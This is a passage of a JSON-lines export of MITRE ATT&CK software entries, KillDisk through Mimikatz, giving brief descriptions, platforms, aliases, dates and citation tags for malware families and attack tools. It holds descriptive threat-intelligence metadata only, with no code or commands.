{"ID":"S0607","name":"KillDisk","description":"[KillDisk](https://attack.mitre.org/software/S0607) is a disk-wiping tool designed to overwrite files with random data to render the OS unbootable. It was first observed as a component of [BlackEnergy](https://attack.mitre.org/software/S0089) malware during cyber attacks against Ukraine in 2015. [KillDisk](https://attack.mitre.org/software/S0607) has since evolved into stand-alone malware used by a variety of threat actors against additional targets in Europe and Latin America; in 2016 a ransomware component was also incorporated into some [KillDisk](https://attack.mitre.org/software/S0607) variants.(Citation: KillDisk Ransomware)(Citation: ESEST Black Energy Jan 2016)(Citation: Trend Micro KillDisk 1)(Citation: Trend Micro KillDisk 2)","url":"https://attack.mitre.org/software/S0607","created":"20 January 2021","last modified":"08 March 2023","version":"1.1","contributors":null,"platforms":"Linux, Windows","aliases":"Win32/KillDisk.NBB, Win32/KillDisk.NBC, Win32/KillDisk.NBD, Win32/KillDisk.NBH, Win32/KillDisk.NBI","type":"malware","relationship citations":"(Citation: ESET Lazarus KillDisk April 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks IRON VIKING ),,(Citation: ESET Telebots Dec 2016),(Citation: ESEST Black Energy Jan 2016),(Citation: Trend Micro KillDisk 1),(Citation: KillDisk Ransomware),(Citation: Trend Micro KillDisk 2)"}
{"ID":"S0599","name":"Kinsing","description":"[Kinsing](https://attack.mitre.org/software/S0599) is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment. (Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020)(Citation: Aqua Security Cloud Native Threat Report June 2021)","url":"https://attack.mitre.org/software/S0599","created":"06 April 2021","last modified":"26 August 2021","version":"1.1","contributors":"Center for Threat-Informed Defense (CTID)","platforms":"Containers, Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Sysdig Kinsing November 2020),(Citation: Aqua Kinsing April 2020)"}
{"ID":"S0437","name":"Kivars","description":"[Kivars](https://attack.mitre.org/software/S0437) is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by [BlackTech](https://attack.mitre.org/groups/G0098) in a 2010 campaign.(Citation: TrendMicro BlackTech June 2017)","url":"https://attack.mitre.org/software/S0437","created":"06 May 2020","last modified":"03 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Palmerworm Sep 2020),(Citation: TrendMicro BlackTech June 2017),,(Citation: TrendMicro BlackTech June 2017)"}
{"ID":"S0250","name":"Koadic","description":"[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool that is publicly available on GitHub. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants, and performs most of its operations using Windows Script Host.(Citation: Github Koadic)(Citation: Palo Alto Sofacy 06-2018)(Citation: MalwareBytes LazyScripter Feb 2021)","url":"https://attack.mitre.org/software/S0250","created":"17 October 2018","last modified":"06 April 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: ATT Sidewinder January 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Reaqta MuddyWater November 2017),(Citation: Palo Alto Sofacy 06-2018),,(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Github Koadic)"}
{"ID":"S0641","name":"Kobalos","description":"[Kobalos](https://attack.mitre.org/software/S0641) is a multi-platform backdoor that can be used against Linux, FreeBSD, and Solaris. [Kobalos](https://attack.mitre.org/software/S0641) has been deployed against high profile targets, including high-performance computers, academic servers, an endpoint security vendor, and a large internet service provider; it has been found in Europe, North America, and Asia. [Kobalos](https://attack.mitre.org/software/S0641) was first identified in late 2019.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)","url":"https://attack.mitre.org/software/S0641","created":"24 August 2021","last modified":"25 October 2021","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET Kobalos Jan 2021),(Citation: ESET Kobalos Feb 2021)"}
{"ID":"S0162","name":"Komplex","description":"[Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX 2017) (Citation: Sofacy Komplex Trojan).","url":"https://attack.mitre.org/software/S0162","created":"14 December 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":"(Citation: XAgentOSX 2017),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Sofacy Komplex Trojan),,(Citation: Sofacy Komplex Trojan)"}
{"ID":"S0236","name":"Kwampirs","description":"[Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by [Orangeworm](https://attack.mitre.org/groups/G0071). It has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. (Citation: Symantec Orangeworm April 2018)","url":"https://attack.mitre.org/software/S0236","created":"17 October 2018","last modified":"18 March 2020","version":"1.1","contributors":"Elger Vinicius S. Rodrigues, @elgervinicius, CYBINT Centre","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Orangeworm April 2018),,(Citation: Symantec Security Center Trojan.Kwampirs),(Citation: Symantec Orangeworm April 2018)"}
{"ID":"S0042","name":"LOWBALL","description":"[LOWBALL](https://attack.mitre.org/software/S0042) is malware used by [admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)","url":"https://attack.mitre.org/software/S0042","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye admin@338),,(Citation: FireEye admin@338)"}
{"ID":"S0349","name":"LaZagne","description":"[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)","url":"https://attack.mitre.org/software/S0349","created":"30 January 2019","last modified":"02 March 2023","version":"1.4","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: Symantec MuddyWater Dec 2018),(Citation: Symantec Leafminer July 2018),(Citation: ESET EvilNum July 2020),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Symantec Elfin Mar 2019),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: Symantec Buckeye),(Citation: FireEye APT35 2018),,(Citation: Picus Labs Proc cump 2022),(Citation: GitHub LaZagne Dec 2018)"}
{"ID":"S0395","name":"LightNeuron","description":"[LightNeuron](https://attack.mitre.org/software/S0395) is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014. [LightNeuron](https://attack.mitre.org/software/S0395) has been used by [Turla](https://attack.mitre.org/groups/G0010) to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: ESET LightNeuron May 2019)","url":"https://attack.mitre.org/software/S0395","created":"28 June 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Linux, Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HUNTER Profile),(Citation: ESET LightNeuron May 2019),,(Citation: ESET LightNeuron May 2019)"}
{"ID":"S0211","name":"Linfo","description":"[Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)","url":"https://attack.mitre.org/software/S0211","created":"18 April 2018","last modified":"06 January 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Linfo May 2012)"}
{"ID":"S0362","name":"Linux Rabbit","description":"[Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit 2018)\n","url":"https://attack.mitre.org/software/S0362","created":"04 March 2019","last modified":"22 December 2020","version":"1.2","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Anomali Linux Rabbit 2018)"}
{"ID":"S0513","name":"LiteDuke","description":"[LiteDuke](https://attack.mitre.org/software/S0513) is a third stage backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016), primarily in 2014-2015. [LiteDuke](https://attack.mitre.org/software/S0513) used the same dropper as [PolyglotDuke](https://attack.mitre.org/software/S0518), and was found on machines also compromised by [MiniDuke](https://attack.mitre.org/software/S0051).(Citation: ESET Dukes October 2019)","url":"https://attack.mitre.org/software/S0513","created":"24 September 2020","last modified":"04 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ESET Dukes October 2019),,(Citation: ESET Dukes October 2019)"}
{"ID":"S0680","name":"LitePower","description":"[LitePower](https://attack.mitre.org/software/S0680) is a downloader and second stage malware that has been used by [WIRTE](https://attack.mitre.org/groups/G0090) since at least 2021.(Citation: Kaspersky WIRTE November 2021)","url":"https://attack.mitre.org/software/S0680","created":"02 February 2022","last modified":"16 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky WIRTE November 2021),,(Citation: Kaspersky WIRTE November 2021)"}
{"ID":"S0681","name":"Lizar","description":"[Lizar](https://attack.mitre.org/software/S0681) is a modular remote access tool written using the .NET Framework that shares structural similarities to [Carbanak](https://attack.mitre.org/software/S0030). It has likely been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least February 2021.(Citation: BiZone Lizar May 2021)(Citation: Threatpost Lizar May 2021)(Citation: Gemini FIN7 Oct 2021)","url":"https://attack.mitre.org/software/S0681","created":"02 February 2022","last modified":"15 April 2022","version":"1.0","contributors":"Sittikorn Sangrattanapitak","platforms":"Windows","aliases":"Tirion","type":"malware","relationship citations":"(Citation: Threatpost Lizar May 2021),(Citation: Gemini FIN7 Oct 2021),,(Citation: BiZone Lizar May 2021),(Citation: Threatpost Lizar May 2021)"}
{"ID":"S0397","name":"LoJax","description":"[LoJax](https://attack.mitre.org/software/S0397) is a UEFI rootkit used by [APT28](https://attack.mitre.org/groups/G0007) to persist remote access software on targeted systems.(Citation: ESET LoJax Sept 2018)","url":"https://attack.mitre.org/software/S0397","created":"02 July 2019","last modified":"30 March 2020","version":"1.1","contributors":"Jean-Ian Boutin, ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET LoJax Sept 2018),,(Citation: ESET LoJax Sept 2018)"}
{"ID":"S0372","name":"LockerGoga","description":"[LockerGoga](https://attack.mitre.org/software/S0372) is ransomware that was first reported in January 2019, and has been tied to various attacks on European companies, including industrial and manufacturing firms.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)","url":"https://attack.mitre.org/software/S0372","created":"16 April 2019","last modified":"08 March 2023","version":"2.0","contributors":"Joe Slowik -  Dragos","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye FIN6 Apr 2019),,(Citation: CarbonBlack LockerGoga 2019),(Citation: Unit42 LockerGoga 2019),(Citation: Wired Lockergoga 2019)"}
{"ID":"S0447","name":"Lokibot","description":"[Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that was first reported in 2015. It is designed to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials. [Lokibot](https://attack.mitre.org/software/S0447) can also create a backdoor into infected systems to allow an attacker to install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020)","url":"https://attack.mitre.org/software/S0447","created":"14 May 2020","last modified":"11 October 2021","version":"2.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit42 SilverTerrier 2018),,(Citation: FSecure Lokibot November 2019),(Citation: TrendMicro Msiexec Feb 2018),(Citation: Infoblox Lokibot January 2019),(Citation: Talos Lokibot Jan 2021)"}
{"ID":"S0582","name":"LookBack","description":"[LookBack](https://attack.mitre.org/software/S0582) is a remote access trojan written in C++ that was used against at least three US utility companies in July 2019. The TALONITE activity group has been observed using [LookBack](https://attack.mitre.org/software/S0582).(Citation: Proofpoint LookBack Malware Aug 2019)(Citation: Dragos TALONITE)(Citation: Dragos Threat Report 2020)","url":"https://attack.mitre.org/software/S0582","created":"01 March 2021","last modified":"26 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Proofpoint LookBack Malware Aug 2019)"}
{"ID":"S0451","name":"LoudMiner","description":"[LoudMiner](https://attack.mitre.org/software/S0451) is a cryptocurrency miner which uses virtualization software to siphon system resources. The miner has been bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.(Citation: ESET LoudMiner June 2019)","url":"https://attack.mitre.org/software/S0451","created":"18 May 2020","last modified":"22 March 2023","version":"1.3","contributors":null,"platforms":"Windows, macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET LoudMiner June 2019)"}
{"ID":"S0121","name":"Lslsass","description":"[Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0121","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1)"}
{"ID":"S0532","name":"Lucifer","description":"[Lucifer](https://attack.mitre.org/software/S0532) is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.(Citation: Unit 42 Lucifer June 2020)","url":"https://attack.mitre.org/software/S0532","created":"16 November 2020","last modified":"01 October 2021","version":"1.1","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit 42 Lucifer June 2020)"}
{"ID":"S0010","name":"Lurid","description":"[Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)","url":"https://attack.mitre.org/software/S0010","created":"31 May 2017","last modified":"31 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Enfal","type":"malware","relationship citations":"(Citation: Villeneuve 2014),,(Citation: Villeneuve 2011)"}
{"ID":"S0500","name":"MCMD","description":"[MCMD](https://attack.mitre.org/software/S0500) is a remote access tool that provides remote command shell capability used by [Dragonfly 2.0](https://attack.mitre.org/groups/G0074).(Citation: Secureworks MCMD July 2019)","url":"https://attack.mitre.org/software/S0500","created":"13 August 2020","last modified":"29 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Secureworks MCMD July 2019),,(Citation: Secureworks MCMD July 2019)"}
{"ID":"S0443","name":"MESSAGETAP","description":"[MESSAGETAP](https://attack.mitre.org/software/S0443) is a data mining malware family deployed by [APT41](https://attack.mitre.org/groups/G0096) into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords. (Citation: FireEye MESSAGETAP October 2019)","url":"https://attack.mitre.org/software/S0443","created":"11 May 2020","last modified":"24 June 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye MESSAGETAP October 2019),(Citation: Crowdstrike GTR2020 Mar 2020),,(Citation: FireEye MESSAGETAP October 2019)"}
{"ID":"S0233","name":"MURKYTOP","description":"[MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018)","url":"https://attack.mitre.org/software/S0233","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye Periscope March 2018),(Citation: CISA AA21-200A APT40 July 2021),,(Citation: FireEye Periscope March 2018)"}
{"ID":"S1016","name":"MacMa","description":"[MacMa](https://attack.mitre.org/software/S1016) is a macOS-based backdoor with a large set of functionalities to control and exfiltrate files from a compromised computer. [MacMa](https://attack.mitre.org/software/S1016) has been observed in the wild since November 2021.(Citation: ESET DazzleSpy Jan 2022)","url":"https://attack.mitre.org/software/S1016","created":"06 May 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"macOS","aliases":"DazzleSpy, OSX.CDDS","type":"malware","relationship citations":",,(Citation: Objective-See MacMa Nov 2021),(Citation: SentinelOne MacMa Nov 2021),(Citation: ESET DazzleSpy Jan 2022)"}
{"ID":"S0282","name":"MacSpy","description":"[MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the darkweb  (Citation: objsee mac malware 2017).","url":"https://attack.mitre.org/software/S0282","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: alientvault macspy),(Citation: objsee mac malware 2017)"}
{"ID":"S0409","name":"Machete","description":"[Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](https://attack.mitre.org/groups/G0095). It is a Python-based backdoor targeting Windows machines that was first observed in 2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020)","url":"https://attack.mitre.org/software/S0409","created":"13 September 2019","last modified":"22 March 2023","version":"2.1","contributors":"Matias Nicolas Porolli, ESET","platforms":"Windows","aliases":"Pyark","type":"malware","relationship citations":"(Citation: ESET Machete July 2019),(Citation: Securelist Machete Aug 2014),,(Citation: ESET Machete July 2019),(Citation: 360 Machete Sep 2020),(Citation: Cylance Machete Mar 2017),(Citation: Securelist Machete Aug 2014)"}
{"ID":"S1060","name":"Mafalda","description":"[Mafalda](https://attack.mitre.org/software/S1060) is a flexible interactive implant that has been used by [Metador](https://attack.mitre.org/groups/G1013). Security researchers assess the [Mafalda](https://attack.mitre.org/software/S1060) name may be inspired by an Argentinian cartoon character that has been popular as a means of political commentary since the 1960s. (Citation: SentinelLabs Metador Sept 2022)","url":"https://attack.mitre.org/software/S1060","created":"26 January 2023","last modified":"04 April 2023","version":"1.0","contributors":"Massimiliano Romano, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),,(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022)"}
{"ID":"S0413","name":"MailSniper","description":"MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.(Citation: GitHub MailSniper)","url":"https://attack.mitre.org/software/S0413","created":"05 October 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Azure AD, Office 365, Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Symantec Leafminer July 2018),,(Citation: GitHub MailSniper),(Citation: Black Hills Attacking Exchange MailSniper, 2016)"}
{"ID":"S0652","name":"MarkiRAT","description":"[MarkiRAT](https://attack.mitre.org/software/S0652) is a remote access Trojan (RAT) compiled with Visual Studio that has been used by [Ferocious Kitten](https://attack.mitre.org/groups/G0137) since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)","url":"https://attack.mitre.org/software/S0652","created":"28 September 2021","last modified":"25 October 2021","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Ferocious Kitten Jun 2021),,(Citation: Kaspersky Ferocious Kitten Jun 2021)"}
{"ID":"S0167","name":"Matryoshka","description":"[Matryoshka](https://attack.mitre.org/software/S0167) is a malware framework used by [CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)","url":"https://attack.mitre.org/software/S0167","created":"16 January 2018","last modified":"23 April 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ClearSky Wilted Tulip July 2017),,(Citation: ClearSky Wilted Tulip July 2017),(Citation: CopyKittens Nov 2015)"}
{"ID":"S0449","name":"Maze","description":"[Maze](https://attack.mitre.org/software/S0449) ransomware, previously known as \"ChaCha\", was discovered in May 2019. In addition to encrypting files on victim machines for impact, [Maze](https://attack.mitre.org/software/S0449) operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.(Citation: FireEye Maze May 2020)(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)","url":"https://attack.mitre.org/software/S0449","created":"18 May 2020","last modified":"24 January 2022","version":"1.2","contributors":"Center for Threat-Informed Defense (CTID); SarathKumar Rajendran, Trimble Inc","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye Maze May 2020),,(Citation: FireEye Maze May 2020),(Citation: McAfee Maze March 2020),(Citation: Sophos Maze VM September 2020)"}
{"ID":"S0459","name":"MechaFlounder","description":"[MechaFlounder](https://attack.mitre.org/software/S0459) is a python-based remote access tool (RAT) that has been used by [APT39](https://attack.mitre.org/groups/G0087). The payload uses a combination of actor developed code and code snippets freely available online in development communities.(Citation: Unit 42 MechaFlounder March 2019)","url":"https://attack.mitre.org/software/S0459","created":"27 May 2020","last modified":"28 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 MechaFlounder March 2019),,(Citation: Unit 42 MechaFlounder March 2019)"}
{"ID":"S0576","name":"MegaCortex","description":"[MegaCortex](https://attack.mitre.org/software/S0576) is ransomware that first appeared in May 2019. (Citation: IBM MegaCortex) [MegaCortex](https://attack.mitre.org/software/S0576) has mainly targeted industrial organizations. (Citation: FireEye Ransomware Disrupt Industrial Production)(Citation: FireEye Financial Actors Moving into OT)","url":"https://attack.mitre.org/software/S0576","created":"17 February 2021","last modified":"26 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: mbed-crypto),(Citation: IBM MegaCortex)"}
{"ID":"S0530","name":"Melcoz","description":"[Melcoz](https://attack.mitre.org/software/S0530) is a banking trojan family built from the open source tool Remote Access PC. [Melcoz](https://attack.mitre.org/software/S0530) was first observed in attacks in Brazil and since 2018 has spread to Chile, Mexico, Spain, and Portugal.(Citation: Securelist Brazilian Banking Malware July 2020)","url":"https://attack.mitre.org/software/S0530","created":"10 November 2020","last modified":"22 December 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Securelist Brazilian Banking Malware July 2020)"}
{"ID":"S0455","name":"Metamorfo","description":"[Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting banks and cryptocurrency services in Brazil and Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) ","url":"https://attack.mitre.org/software/S0455","created":"26 May 2020","last modified":"18 October 2022","version":"2.0","contributors":"Chen Erlich, @chen_erlich, enSilo; Jose Luis Sánchez Martinez","platforms":"Windows","aliases":"Casbaneiro","type":"malware","relationship citations":",,(Citation: Medium Metamorfo Apr 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: Fortinet Metamorfo Feb 2020)"}
{"ID":"S0688","name":"Meteor","description":"[Meteor](https://attack.mitre.org/software/S0688) is a wiper that was used against Iranian government organizations, including Iranian Railways, the Ministry of Roads, and Urban Development systems, in July 2021. [Meteor](https://attack.mitre.org/software/S0688) is likely a newer version of similar wipers called Stardust and Comet that were reportedly used by a group called \"Indra\" since at least 2019 against private companies in Syria.(Citation: Check Point Meteor Aug 2021)","url":"https://attack.mitre.org/software/S0688","created":"07 March 2022","last modified":"14 April 2022","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Tsubasa Matsuda, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Check Point Meteor Aug 2021)"}
{"ID":"S0339","name":"Micropsia","description":"[Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)","url":"https://attack.mitre.org/software/S0339","created":"29 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Radware Micropsia July 2018),(Citation: Talos Micropsia June 2017)"}
{"ID":"S1015","name":"Milan","description":"[Milan](https://attack.mitre.org/software/S1015) is a backdoor implant based on [DanBot](https://attack.mitre.org/software/S1014) that was written in Visual C++ and .NET. [Milan](https://attack.mitre.org/software/S1015) has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020.(Citation: ClearSky Siamesekitten August 2021)(Citation: Kaspersky Lyceum October 2021)","url":"https://attack.mitre.org/software/S1015","created":"06 June 2022","last modified":"31 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":"James","type":"malware","relationship citations":"(Citation: Kaspersky Lyceum October 2021),(Citation: Accenture Lyceum Targets November 2021),,(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Accenture Lyceum Targets November 2021)"}
{"ID":"S0179","name":"MimiPenguin","description":"[MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to [Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux platforms. (Citation: MimiPenguin GitHub May 2017)","url":"https://attack.mitre.org/software/S0179","created":"16 January 2018","last modified":"15 October 2021","version":"1.2","contributors":"Vincent Le Toux","platforms":"Linux","aliases":null,"type":"tool","relationship citations":"(Citation: Palo Alto Black-T October 2020),,(Citation: Picus Labs Proc cump 2022),(Citation: MimiPenguin GitHub May 2017)"}
{"ID":"S0002","name":"Mimikatz","description":"[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","url":"https://attack.mitre.org/software/S0002","created":"31 May 2017","last modified":"07 March 2023","version":"1.7","contributors":"Vincent Le Toux","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Dark Reading APT39 JAN 2019),(Citation: NCC Group Chimera January 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Mandiant APT1),(Citation: NCC Group APT15 Alive and Strong),(Citation: Bizeul 2014),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Thrip June 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: FireEye APT39 Jan 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Symantec Tick Apr 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: Symantec Leafminer July 2018),(Citation: Kaspersky Carbanak),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Microsoft GALLIUM December 2019),(Citation: PTSecurity Cobalt Dec 2016),(Citation: FireEye APT32 May 2017),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT41 Aug 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: NCC Group TA505),(Citation: Kaspersky Sofacy),(Citation: FireEye TRITON 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Trend Micro Tick November 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: Symantec Elfin Mar 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Symantec Chafer February 2018),(Citation: ESET Turla Mosquito May 2018),(Citation: F-Secure The Dukes),(Citation: Unit42 OilRig Playbook 2023),(Citation: Kaspersky CactusPete Aug 2020),(Citation: BitDefender Chafer May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Symantec Whitefly March 2019),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Group IB APT 41 June 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye APT38 Oct 2018),(Citation: KISA Operation Muzabi),(Citation: Cylance Cleaver),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Cybereason Soft Cell June 